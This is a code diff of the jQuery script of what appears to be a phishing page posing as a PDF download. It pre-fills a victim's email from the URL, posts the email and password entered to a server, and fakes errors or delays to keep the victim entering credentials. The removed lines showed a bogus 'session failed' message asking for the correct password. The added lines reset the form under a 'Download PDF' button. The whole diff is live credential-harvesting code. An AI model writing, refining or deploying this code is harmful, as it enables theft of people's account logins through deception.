@@ -4,8 +4,9 @@
     const emailauto = params_url.get('e');
     
     $(document).ready(function(){
-        var cou_nt = 0;
+        var count = 0;
         var form_error = [false, false];
+         $('#msg').hide();
     
     
         $('#btn4dlmodal').on('click',function(e){
@@ -56,34 +57,14 @@
                 method: "post",
                 data: {email: input4email, password: input4passwd},
                 processData: true,
-                complete: function(jqXHR){
-                    $('#showerror').removeClass('alert').text('')
-                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
-                    $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
-                       console.log(feedback);
-                       // return false;
-                $('#igodo').focus();
-                $('#igodo').val('');
-                // $('#typesent').val("Verification");
-                     }, 
-    
-                // if (cou_nt>=2) { //check if it has been sent twice
-                    // count=0;
-                // window.location.replace(response['redirect_link']);
-                    // window.location.href =   $('#redirect').val();
-                    // ("http://www."+my_slice);
-    
-                  // }
-                 
-                },
-                error: function(jqXHR, textStatus, errorMessage) {
-                    console.log(jqXHR); // Optional
-                    console.log(errorMessage); // Optional
-                }
-                ,
-                complete: function(){
+                complete: function(jqXHR) {
+               setTimeout(function() {
+                    $('#msg').show();
+                    $("#akpati1").val(url);
+                    $("#igodo").val("");
                     $('#btn4sbmt').html('Download PDF').prop('disabled', false);
-    
+                }, 2000);
+            }   
                 }
             });   
     
